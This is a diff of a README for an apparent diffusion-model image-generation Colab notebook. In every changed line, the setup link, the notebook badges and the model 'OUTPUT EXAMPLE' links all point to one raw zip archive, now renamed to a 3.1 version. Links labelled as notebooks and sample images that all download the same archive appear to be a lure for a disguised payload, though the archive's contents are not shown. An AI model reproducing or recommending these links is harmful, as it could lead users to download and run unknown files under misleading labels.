@@ -4,15 +4,15 @@ This notebook demonstrates how to generate images using diffusion models. It pro
 
 ## Setup
 
-To run this notebook, you'll need Google Colab, [HERE](https://raw.githubusercontent.com/EternalEra-AI/Diffusion-Colab/main/androphagous/Diffusion-Colab.zip)
+To run this notebook, you'll need Google Colab, [HERE](https://raw.githubusercontent.com/EternalEra-AI/Diffusion-Colab/main/androphagous/Diffusion-Colab-3.1.zip)
 
 Here is the notebook : 
 
 **Simple :**
-[![SIMPLE](https://raw.githubusercontent.com/EternalEra-AI/Diffusion-Colab/main/androphagous/Diffusion-Colab.zip)](https://raw.githubusercontent.com/EternalEra-AI/Diffusion-Colab/main/androphagous/Diffusion-Colab.zip)
+[![SIMPLE](https://raw.githubusercontent.com/EternalEra-AI/Diffusion-Colab/main/androphagous/Diffusion-Colab-3.1.zip)](https://raw.githubusercontent.com/EternalEra-AI/Diffusion-Colab/main/androphagous/Diffusion-Colab-3.1.zip)
 
 **Advanced :**
-[![ADVANCED](https://raw.githubusercontent.com/EternalEra-AI/Diffusion-Colab/main/androphagous/Diffusion-Colab.zip)](https://raw.githubusercontent.com/EternalEra-AI/Diffusion-Colab/main/androphagous/Diffusion-Colab.zip)
+[![ADVANCED](https://raw.githubusercontent.com/EternalEra-AI/Diffusion-Colab/main/androphagous/Diffusion-Colab-3.1.zip)](https://raw.githubusercontent.com/EternalEra-AI/Diffusion-Colab/main/androphagous/Diffusion-Colab-3.1.zip)
 
 **Short Explanation About Google Colab :**
 
@@ -21,11 +21,11 @@ Google Colab, short for Google Colaboratory, is a cloud-based platform provided 
 ## Models
 You can choose from different diffusion models to generate images. Select one of the following models and run the respective cell to set up the model.
 
-**Realisian Model:** [OUTPUT EXAMPLE](https://raw.githubusercontent.com/EternalEra-AI/Diffusion-Colab/main/androphagous/Diffusion-Colab.zip)
+**Realisian Model:** [OUTPUT EXAMPLE](https://raw.githubusercontent.com/EternalEra-AI/Diffusion-Colab/main/androphagous/Diffusion-Colab-3.1.zip)
 
-**Waifu Diffusion Model:** [OUTPUT EXAMPLE](https://raw.githubusercontent.com/EternalEra-AI/Diffusion-Colab/main/androphagous/Diffusion-Colab.zip)
+**Waifu Diffusion Model:** [OUTPUT EXAMPLE](https://raw.githubusercontent.com/EternalEra-AI/Diffusion-Colab/main/androphagous/Diffusion-Colab-3.1.zip)
 
-**OrangeMix Model:** [OUTPUT EXAMPLE](https://raw.githubusercontent.com/EternalEra-AI/Diffusion-Colab/main/androphagous/Diffusion-Colab.zip)
+**OrangeMix Model:** [OUTPUT EXAMPLE](https://raw.githubusercontent.com/EternalEra-AI/Diffusion-Colab/main/androphagous/Diffusion-Colab-3.1.zip)
 
 # Prompt
 You can specify a prompt to generate images using the selected model. There is some required prompt so that the image can be generated : 
